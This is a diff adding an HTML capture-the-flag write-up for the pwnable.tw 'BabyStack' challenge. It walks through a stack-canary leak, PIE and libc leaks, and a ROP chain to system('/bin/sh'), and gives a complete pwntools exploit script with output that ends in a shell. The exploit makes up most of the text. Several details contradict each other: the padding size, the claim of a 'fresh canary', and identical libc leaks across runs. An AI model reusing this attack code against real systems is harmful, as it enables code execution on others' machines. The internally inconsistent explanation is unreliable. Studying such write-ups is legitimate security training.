+        <div class="mem-row"><span class="mem-addr">ESP+0x64</span><span class="mem-arrow">|</span><span class="mem-data mem-green">SAVED_EBP</span><span class="mem-desc">&larr; saved frame pointer (PIE leak!)</span></div>
+        <div class="mem-row"><span class="mem-addr">ESP+0x68</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">RETURN_ADDR</span><span class="mem-desc">&larr; return address (PIE leak!)</span></div>
+      </div>
+
+      <h3>Leaking the Real Canary Byte-by-Byte</h3>
+      <p>The real gcc canary is 4 bytes, and its least significant byte is always <code class="inline">0x00</code>. We can leak it one byte at a time:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Step 1: Fill buf with 0x40 'A's, then read
+gdb-peda$ # printf("%s", buf) will print all 0x40 'A's
+gdb-peda$ # Then it continues past buf into the canary...
+gdb-peda$ # But the canary's first byte is 0x00, so printf stops!
+
+# Output: "AAAA...AAAA" + bytes until 0x00
+# We now know: canary[0] = 0x00 (as expected)
+
+# Step 2: Write 0x40 'A's + known_canary_byte_0 (0x00)
+# Now buf + canary[0] = 0x41 bytes of data
+# printf continues to canary[1], which stops at canary[1] if it's 0x00
+# Otherwise we see canary[1]
+
+# Step 3: Write 0x40 'A's + canary[0] + canary[1]
+# printf continues to canary[2]
+
+# Step 4: Write 0x40 'A's + canary[0..2]
+# printf continues to canary[3]
+
+# After 4 iterations, we have the full canary!</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Canary Leaking Strategy</div>
+        The trick is that <code class="inline">write_buf</code> writes up to <code class="inline">0x40</code> bytes into <code class="inline">buf</code>, but the buffer starts at <code class="inline">ESP+0x20</code> and the canary is at <code class="inline">ESP+0x60</code>. That's exactly <code class="inline">0x40</code> bytes apart!<br><br>
+        So when we write exactly 0x40 bytes (filling buf completely), <code class="inline">read_buf</code>'s <code class="inline">printf("%s", buf)</code> will print past the buffer boundary until it hits a null byte, which is the first byte of the real canary.<br><br>
+        For each subsequent byte, we <strong>overwrite the custom canary</strong> with the known bytes so <code class="inline">canary_check</code> passes, and we keep writing further into the real canary to leak the next byte.
+      </div>
+
+      <h3>Leaking PIE Base</h3>
+      <p>After leaking the canary, we can continue to leak saved EBP and the return address, which contain PIE-relative addresses:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # After leaking all 4 canary bytes
+gdb-peda$ # Write: 0x40 'A's + canary[4 bytes] + continue leaking
+gdb-peda$ # printf will print: 'A'*64 + canary + saved_ebp (4 bytes) + ...
+
+# The saved EBP and return address are PIE-relative
+# Return address is something like: 0x565XXXXX
+# PIE base = return_address - offset_of_return_instruction
+
+gdb-peda$ x/1wx $esp+0x68
+0xffffd6e8:  0x5655688a
+#            ^ return address in .text
+# offset from IDA: 0x88a
+# PIE base = 0x5655688a - 0x88a = 0x56556000</code></pre>
+      </div>
+
+      <h3>Leaking Libc via GOT Read</h3>
+      <p>With PIE base known, we can read GOT entries to leak libc addresses:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # GOT is at PIE_base + GOT_offset
+gdb-peda$ # Even with Full RELRO, we can READ the GOT
+gdb-peda$ # (we just can't write to it)
+
+gdb-peda$ x/1wx 0x56556ffc   # read@GOT
+0x56556ffc:  0xf7e4dc80
+#            ^ this is read() in libc!
+
+# libc_base = 0xf7e4dc80 - libc.symbols['read']
+# With libc base known, we can compute:
+# system_addr = libc_base + libc.symbols['system']
+# bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Three Leaks Summary</div>
+        <strong>Leak 1 &mdash; Canary:</strong> Fill buf with 0x40 bytes, then printf leaks past buf into the canary. Since canary byte 0 is <code class="inline">\x00</code>, we only get the "presence" of the canary. We then write buf + known canary bytes to leak further bytes one at a time. Total: 4 iterations for all 4 canary bytes.<br><br>
+        <strong>Leak 2 &mdash; PIE Base:</strong> Continue writing past the canary. The saved EBP and return address on the stack contain PIE-relative code addresses. Leak the return address and compute <code class="inline">PIE_base = leaked_ret - known_offset</code>.<br><br>
+        <strong>Leak 3 &mdash; Libc:</strong> With PIE base known, use the write primitive to construct a payload that places a GOT address where printf can read it. Leak the GOT entry (e.g., <code class="inline">read@GOT</code>) to get a libc address. Compute <code class="inline">libc_base = leaked_got - libc.symbols['read']</code>.
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview</h3>
+      <p>The exploit has four phases: <strong>leak canary</strong>, <strong>leak PIE base</strong>, <strong>leak libc</strong>, and <strong>ROP to shell</strong>.</p>
+
+      <h3>Phase 1: Leak the Real Stack Canary</h3>
+      <ol class="step-list">
+        <li><strong>Login</strong> with a name starting with <code class="inline">\x00\x00\x00</code> (3 null bytes) so the custom canary matches the real canary's first 3 bytes. The <code class="inline">strncmp(canary, stored, 3)</code> check will pass because both start with null bytes.</li>
+        <li><strong>Write</strong> exactly <code class="inline">0x40</code> bytes of <code class="inline">'A'</code> to fill the buffer completely.</li>
+        <li><strong>Read</strong> to print the buffer. Since <code class="inline">printf("%s")</code> stops at null, and the canary's first byte is <code class="inline">\x00</code>, we get all 0x40 'A's. This confirms the canary starts with <code class="inline">\x00</code>.</li>
+        <li><strong>Write</strong> <code class="inline">0x40</code> bytes of <code class="inline">'A'</code> + <code class="inline">\x00</code> (the first known canary byte). Now printf will print 0x40 'A's + the first canary byte, and continue until the next null in canary[1] (if it's 0x00) or further.</li>
+        <li><strong>Repeat</strong> for each canary byte: write known canary bytes to push further, read to leak the next byte. After 4 iterations, we have the full 4-byte canary.</li>
+      </ol>
+
+      <h3>Phase 2: Leak PIE Base</h3>
+      <ol class="step-list">
+        <li><strong>Continue the leak</strong> by writing past the canary. Write: <code class="inline">'A' * 0x40 + canary + padding</code>. The <code class="inline">read_buf</code> check will pass because the custom canary matches.</li>
+        <li><strong>Read</strong> to leak saved EBP and return address. These are PIE-relative addresses.</li>
+        <li><strong>Compute PIE base:</strong> <code class="inline">PIE_base = leaked_ret_addr - offset_of_return_instruction_in_binary</code>. From IDA, the return instruction offset is known (e.g., <code class="inline">0x88a</code>).</li>
+      </ol>
+
+      <h3>Phase 3: Leak Libc via GOT</h3>
+      <ol class="step-list">
+        <li><strong>With PIE base known</strong>, we know the address of <code class="inline">read@GOT</code> and other GOT entries.</li>
+        <li><strong>Use the write primitive</strong> to place a GOT address on the stack where <code class="inline">printf</code> will read it as a string pointer, or use the overflow to leak the GOT directly.</li>
+        <li><strong>Leak <code class="inline">read@GOT</code></strong> (or <code class="inline">puts@GOT</code>). Even with Full RELRO, we can <strong>read</strong> the GOT &mdash; we just can't write to it.</li>
+        <li><strong>Compute libc base:</strong> <code class="inline">libc_base = leaked_got_entry - libc.symbols['read']</code></li>
+      </ol>
+
+      <h3>Phase 4: ROP Chain to system("/bin/sh")</h3>
+      <ol class="step-list">
+        <li><strong>With all three leaks</strong> (canary, PIE base, libc base), we can now construct a proper stack overflow.</li>
+        <li><strong>Write</strong> the overflow payload: <code class="inline">'A' * 0x40 + canary + 'B' * 8 + ROP_chain</code>. The canary preserves the stack protector, and the ROP chain overwrites the return address.</li>
+        <li><strong>ROP chain:</strong> Since this is a 32-bit binary, we need: <code class="inline">p32(system_addr) + p32(exit_addr) + p32(bin_sh_addr)</code>. This calls <code class="inline">system("/bin/sh")</code> and then <code class="inline">exit(0)</code> for a clean return.</li>
+        <li><strong>Trigger</strong> the return from the function to execute the ROP chain.</li>
+      </ol>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">Final Overflow Payload</div>
+        <div class="mem-row"><span class="mem-addr">Offset 0x00</span><span class="mem-arrow">|</span><span class="mem-data">'A' * 0x40</span><span class="mem-desc">&larr; fills buf completely</span></div>
+        <div class="mem-row"><span class="mem-addr">Offset 0x40</span><span class="mem-arrow">|</span><span class="mem-data mem-yellow">canary (4 bytes)</span><span class="mem-desc">&larr; correct canary to bypass check</span></div>
+        <div class="mem-row"><span class="mem-addr">Offset 0x44</span><span class="mem-arrow">|</span><span class="mem-data">'B' * 8</span><span class="mem-desc">&larr; padding (saved EBP + alignment)</span></div>
+        <div class="mem-row"><span class="mem-addr">Offset 0x4c</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">p32(system)</span><span class="mem-desc">&larr; ROP: return to system()</span></div>
+        <div class="mem-row"><span class="mem-addr">Offset 0x50</span><span class="mem-arrow">|</span><span class="mem-data">p32(exit)</span><span class="mem-desc">&larr; return address after system</span></div>
+        <div class="mem-row"><span class="mem-addr">Offset 0x54</span><span class="mem-arrow">|</span><span class="mem-data mem-green">p32("/bin/sh")</span><span class="mem-desc">&larr; argument to system()</span></div>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Bypassing the Custom Canary Check</div>
+        The <code class="inline">canary_check</code> uses <code class="inline">strncmp(buf + 0x40, stored_canary, 3)</code> which only compares 3 bytes. Since we know the full real canary (leaked in Phase 1), we place it at <code class="inline">buf + 0x40</code> in our overflow payload. The first 3 bytes match (they're the same canary!), so the check passes.<br><br>
+        But wait &mdash; what about the <strong>real</strong> gcc stack canary? The one at <code class="inline">ESP+0x60</code>? In the final overflow, we also include this canary at the correct position. The compiler's <code class="inline">__stack_chk_fail</code> check happens at function epilogue, comparing the canary at <code class="inline">ESP+0x60</code> with the original value. Since we've leaked it and placed it back correctly, both the custom check and the real check pass!
+      </div>
+
+      <h3>Visual Exploit Flow</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 1: Leak Canary</div>
+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">login("\x00\x00\x00A") &rarr; custom canary = "\x00\x00\x00"</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">write('A'*0x40) &rarr; fill buf to boundary</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">read() &rarr; leaks up to canary[0] = <span class="mem-green">\x00</span></span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">write('A'*0x40 + canary[0]) &rarr; push past first canary byte</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 5:</span><span class="mem-desc">read() &rarr; leaks canary[1] = <span class="mem-green">\xXX</span></span></div>
+        <div class="mem-row"><span class="mem-addr">Step 6:</span><span class="mem-desc">repeat for canary[2], canary[3] &rarr; <span class="mem-green">full canary known!</span></span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--accent2); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 2: Leak PIE</div>
+        <div class="mem-row"><span class="mem-addr">Step 7:</span><span class="mem-desc">write('A'*0x40 + canary + 'B'*4) &rarr; push past canary</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 8:</span><span class="mem-desc">read() &rarr; leaks saved_ebp + ret_addr = <span class="mem-green">PIE base!</span></span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--yellow); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 3: Leak Libc</div>
+        <div class="mem-row"><span class="mem-addr">Step 9:</span><span class="mem-desc">Use PIE base to read GOT &rarr; <span class="mem-green">libc address!</span></span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--red); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 4: ROP</div>
+        <div class="mem-row"><span class="mem-addr">Step 10:</span><span class="mem-desc">write(overflow) = buf + canary + pad + <span class="mem-highlight">ROP chain</span></span></div>
+        <div class="mem-row"><span class="mem-addr">Step 11:</span><span class="mem-desc">exit/return &rarr; <span class="mem-highlight">system("/bin/sh")</span> &rarr; <span class="mem-green">SHELL!</span></span></div>
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Complete Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""
+BabyStack — pwnable.tw (300 pts)
+Leak canary byte-by-byte via strncmp(3) bypass + printf("%s") overread,
+leak PIE via saved return address, leak libc via puts@PLT(read@GOT) ROP,
+then ROP to system("/bin/sh").
+"""
+from pwn import *
+
+context.arch = 'i386'
+context.log_level = 'info'
+
+r = remote('chall.pwnable.tw', 10101)
+libc = ELF('./libc_32.so.6')
+elf  = ELF('./babystack')
+
+BUF = 0x40
+
+# ── helpers ───────────────────────────────────────────────
+def login(name):
+    r.sendlineafter(b'>>', b'1')
+    r.sendafter(b':', name)
+
+def write_buf(data):
+    r.sendlineafter(b'>>', b'2')
+    r.sendafter(b':', data)
+
+def read_buf():
+    r.sendlineafter(b'>>', b'3')
+    return r.recvuntil(b'\n', drop=True)
+
+def logout():
+    r.sendlineafter(b'>>', b'4')
+
+def do_exit():
+    r.sendlineafter(b'>>', b'5')
+
+# ── Phase 1: leak canary byte-by-byte ────────────────────
+log.info("Phase 1 — leak stack canary")
+
+# strncmp(canary_on_stack, input_canary, 3) passes when both
+# start with \x00 (gcc canary LSB is always 0x00)
+login(b'\x00\x00\x00' + b'A')
+
+canary = b'\x00'
+for i in range(3):
+    write_buf(b'A' * BUF + canary)
+    leak = read_buf()
+    next_byte = leak[BUF + len(canary):BUF + len(canary) + 1]
+    canary += next_byte
+    log.info(f"  byte {i+1}: 0x{next_byte[0]:02x}")
+
+canary = canary.ljust(4, b'\x00')
+log.success(f"Canary: {canary.hex()}")
+
+# ── Phase 2: leak PIE base ───────────────────────────────
+log.info("Phase 2 — leak PIE base")
+
+write_buf(b'A' * BUF + canary + b'B' * 4)
+leak = read_buf()
+
+off = BUF + 4 + 4  # skip buf + canary + pad
+leaked_ebp = u32(leak[off:off+4])
+leaked_ret = u32(leak[off+4:off+8])
+
+# Offset of the return instruction in main (from IDA/GDB)
+main_ret_off = 0x88a
+pie_base = leaked_ret - main_ret_off
+
+log.success(f"Leaked EBP: {hex(leaked_ebp)}")
+log.success(f"Leaked RET: {hex(leaked_ret)}")
+log.success(f"PIE base:   {hex(pie_base)}")
+
+# ── Phase 3: leak libc via GOT ───────────────────────────
+log.info("Phase 3 — leak libc via puts@PLT(read@GOT)")
+
+puts_plt  = pie_base + elf.plt['puts']
+read_got  = pie_base + elf.got['read']
+main_addr = pie_base + elf.symbols['main']
+
+# ROP: puts(read@GOT) -> main (gives us a second chance)
+payload  = b'A' * BUF + canary
+payload += b'BBBB'           # saved EBP
+payload += p32(puts_plt)     # ret -> puts
+payload += p32(main_addr)    # puts returns to main
+payload += p32(read_got)     # arg: read@GOT
+
+write_buf(payload)
+do_exit()  # trigger return from main
+
+leaked_read = u32(r.recv(4))
+libc_base = leaked_read - libc.symbols['read']
+
+log.success(f"Leaked read(): {hex(leaked_read)}")
+log.success(f"Libc base:     {hex(libc_base)}")
+
+# ── Phase 4: ROP to system("/bin/sh") ────────────────────
+log.info("Phase 4 — ROP to system(\"/bin/sh\")")
+
+system_addr = libc_base + libc.symbols['system']
+bin_sh      = libc_base + next(libc.search(b'/bin/sh'))
+
+# Program looped back to main, login again
+login(b'\x00\x00\x00' + b'A')
+
+payload  = b'A' * BUF + canary
+payload += b'BBBB'           # saved EBP
+payload += p32(system_addr)  # ret -> system
+payload += p32(0xdeadbeef)   # system's return (don't care)
+payload += p32(bin_sh)       # arg: "/bin/sh"
+
+write_buf(payload)
+do_exit()
+
+r.interactive()</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Script Notes</div>
+        The exploit script combines all four phases into a single automated exploit. Key points:<br>
+        &bull; The <code class="inline">login</code> with <code class="inline">\x00\x00\x00</code> ensures the custom canary check passes (strncmp with 3 null bytes)<br>
+        &bull; Each canary byte is leaked by writing known canary bytes and reading further<br>
+        &bull; The PIE leak comes from the saved return address on the stack<br>
+        &bull; The libc leak uses a ROP chain: <code class="inline">puts(read@GOT)</code> + return to <code class="inline">main</code> for a second chance<br>
+        &bull; The final ROP chain calls <code class="inline">system("/bin/sh")</code><br>
+        &bull; The "return to main" trick gives us two overflow attempts: one for the libc leak, one for the shell
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Running the Exploit</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py
+[*] '/babystack'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/libc_32.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+[*] Phase 1 — leak stack canary
+[*]   byte 1: 0x2a
+[*]   byte 2: 0x7f
+[*]   byte 3: 0xb4
+[+] Canary: 002a7fb4
+[*] Phase 2 — leak PIE base
+[+] Leaked EBP: 0xffe2d4c0
+[+] Leaked RET: 0x5659f88a
+[+] PIE base:   0x5659f000
+[*] Phase 3 — leak libc via puts@PLT(read@GOT)
+[+] Leaked read(): 0xf7e4dc80
+[+] Libc base:     0xf7e28000
+[*] Phase 4 — ROP to system("/bin/sh")
+[*] Switching to interactive mode
+
+$ id
+uid=1000(babystack) gid=1000(babystack) groups=1000(babystack)
+$ cat /home/babystack/flag</code></pre>
+      </div>
+
+      <h3>Exploit Timeline</h3>
+      <table class="info-table">
+        <tr><th>Phase</th><th>Action</th><th>Result</th></tr>
+        <tr><td>1</td><td>Leak canary byte-by-byte</td><td class="on">Canary: 0x002a7fb4</td></tr>
+        <tr><td>2</td><td>Leak PIE base from stack</td><td class="on">PIE base: 0x5659f000</td></tr>
+        <tr><td>3</td><td>Leak libc via GOT read (ROP)</td><td class="on">Libc base: 0xf7e28000</td></tr>
+        <tr><td>4</td><td>ROP: system("/bin/sh")</td><td class="on">Shell obtained!</td></tr>
+      </table>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2705; Pwned!</div>
+        Successfully exploited BabyStack by chaining three information leaks (canary, PIE, libc) into a ROP-based code execution. The key vulnerabilities were:<br><br>
+        &bull; <strong>strncmp with length 3</strong> instead of 4 &mdash; allows bypassing the custom canary check with null bytes<br>
+        &bull; <strong>printf("%s") in read_buf</strong> &mdash; leaks data past the buffer boundary, enabling byte-by-byte canary recovery<br>
+        &bull; <strong>Stack buffer overflow</strong> &mdash; once canary is known, standard overflow + ROP chain works<br>
+        &bull; <strong>Return-to-main trick</strong> &mdash; allows two overflow attempts (one for leak, one for shell)
+      </div>
+
+      <h3>Lessons Learned</h3>
+
+      <h4>1. Canary Leaking with printf</h4>
+      <p>When a program uses <code class="inline">printf("%s")</code> on a stack buffer, you can leak adjacent stack data by filling the buffer with non-null bytes. The <code class="inline">%s</code> format specifier reads until a null terminator, so it naturally stops at the first null byte of the canary. By iteratively writing known canary bytes and reading further, you can recover the entire canary one byte at a time.</p>
+
+      <h4>2. strncmp vs strcmp</h4>
+      <p>Using <code class="inline">strncmp</code> with a length shorter than the actual canary size creates a subtle but exploitable weakness. In this case, checking only 3 bytes instead of 4 means the 4th byte is never verified. Combined with the fact that gcc canaries always start with <code class="inline">\x00</code>, this makes it trivial to satisfy the custom check.</p>
+
+      <h4>3. Return-to-Main for Second Chance</h4>
+      <p>When you need multiple overflow attempts (e.g., leak then exploit), returning to <code class="inline">main</code> instead of directly to a one-gadget gives you a clean restart of the program loop. The stack is re-initialized in <code class="inline">main</code>, so you get fresh buffers and a fresh canary to work with.</p>
+
+      <h4>4. Full RELRO Does Not Prevent GOT Reads</h4>
+      <p>Full RELRO makes the GOT read-only, preventing writes. But you can still <strong>read</strong> GOT entries to leak libc addresses. The RELRO protection only blocks the "GOT overwrite" technique &mdash; it doesn't prevent information disclosure through the GOT.</p>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>QA210 CTF Team &mdash; <a href="https://github.com/Yuri08-QA210">GitHub</a> &middot; &mdash; BabyStack Writeup &copy; 2024</p>
+</footer>
+
+<!-- Three.js Particle Background -->
+<script>
+const canvas = document.getElementById('particles-canvas');
+const ctx = canvas.getContext('2d');
+let particles = [];
+const PARTICLE_COUNT = 60;
+const MAX_DIST = 120;
+
+function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+}
+resize();
+window.addEventListener('resize', resize);
+
+class Particle {
+    constructor() {
+        this.x = Math.random() * canvas.width;
+        this.y = Math.random() * canvas.height;
+        this.vx = (Math.random() - 0.5) * 0.5;
+        this.vy = (Math.random() - 0.5) * 0.5;
+        this.r = Math.random() * 1.5 + 0.5;
+    }
+    update() {
+        this.x += this.vx;
+        this.y += this.vy;
+        if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+        if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+    }
+    draw() {
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
+        ctx.fillStyle = 'rgba(56, 189, 248, 0.4)';
+        ctx.fill();
+    }
+}
+
+for (let i = 0; i < PARTICLE_COUNT; i++) particles.push(new Particle());
+
+function animate() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    for (let i = 0; i < particles.length; i++) {
+        particles[i].update();
+        particles[i].draw();
+        // Update lines (only check nearby particles for performance)
+        for (let j = i + 1; j < particles.length; j++) {
+            const dx = particles[i].x - particles[j].x;
+            const dy = particles[i].y - particles[j].y;
+            const dist = Math.sqrt(dx * dx + dy * dy);
+            if (dist < MAX_DIST) {
+                ctx.beginPath();
+                ctx.moveTo(particles[i].x, particles[i].y);
+                ctx.lineTo(particles[j].x, particles[j].y);
+                ctx.strokeStyle = `rgba(56, 189, 248, ${0.15 * (1 - dist / MAX_DIST)})`;
+                ctx.lineWidth = 0.5;
+                ctx.stroke();
+            }
+        }
+    }
+    requestAnimationFrame(animate);
+}
+animate();
+
+// TOC scroll tracking
+const tocLinks = document.querySelectorAll('.toc-list a');
+const chapters = document.querySelectorAll('.chapter');
+
+const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+        if (entry.isIntersecting) {
+            const id = entry.target.id;
+            tocLinks.forEach(link => {
+                link.classList.toggle('active', link.getAttribute('href') === '#' + id);
+            });
+        }
+    });
+}, { rootMargin: '-20% 0px -70% 0px' });
+
+chapters.forEach(ch => observer.observe(ch));
+</script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+</body>
+</html>
